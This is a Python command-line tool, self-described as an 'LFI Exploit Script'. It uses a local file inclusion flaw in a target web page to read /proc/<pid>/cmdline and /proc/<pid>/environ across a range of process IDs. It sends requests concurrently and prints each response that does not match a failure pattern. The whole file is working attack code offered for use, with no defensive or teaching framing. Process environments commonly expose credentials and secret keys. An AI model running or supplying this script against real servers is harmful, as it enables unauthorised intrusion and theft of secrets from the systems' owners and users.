import argparse
import asyncio
import aiohttp
import re
from urllib.parse import urlencode

async def send_request(target, param, pid, filter_regex, method):
    if method == 'post':
        url = target
        data_cmdline = {param.split('=')[0]: param.split('=')[1] + '/proc/{}/cmdline'.format(pid)}
        data_environ = {param.split('=')[0]: param.split('=')[1] + '/proc/{}/environ'.format(pid)}
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        async with aiohttp.ClientSession() as session:
            async with session.post(url, data=data_cmdline, headers=headers) as response:
                response_text_cmdline = await response.text()
            async with session.post(url, data=data_environ, headers=headers) as response:
                response_text_environ = await response.text()
    else:
        url_cmdline = target + '/?' + param + '/proc/{}/cmdline'.format(pid)
        url_environ = target + '/?' + param + '/proc/{}/environ'.format(pid)
        async with aiohttp.ClientSession() as session:
            async with session.get(url_cmdline) as response:
                response_text_cmdline = await response.text()
            async with session.get(url_environ) as response:
                response_text_environ = await response.text()
    if not re.search(filter_regex, response_text_cmdline):
        print(f"[+] Success with cmdline for PID {pid}: {response_text_cmdline}")
    if not re.search(filter_regex, response_text_environ):
        print(f"[+] Success with environ for PID {pid}: {response_text_environ}")

async def main():
    parser = argparse.ArgumentParser(description='LFI Exploit Script')
    parser.add_argument('-t', '--target', required=True, help='Target URL (http://DOMAIN/PAGE)')
    parser.add_argument('-p', '--param', required=True, help='LFI param with the working LFI path')
    parser.add_argument('-r', '--pid-range', required=True, help='Range of PIDs (number - number)')
    parser.add_argument('-fr', '--filter-regex', required=True, help='Regex to match on failure')
    parser.add_argument('-X', '--method', default='get', help='HTTP method (get or post)')
    args = parser.parse_args()
    args.method = args.method.lower();
    start_pid, end_pid = map(int, args.pid_range.split('-'))
    tasks = []
    for pid in range(start_pid, end_pid + 1):
        tasks.append(send_request(args.target, args.param, pid, args.filter_regex, args.method))
    await asyncio.gather(*tasks)

if __name__ == '__main__':
    asyncio.run(main())
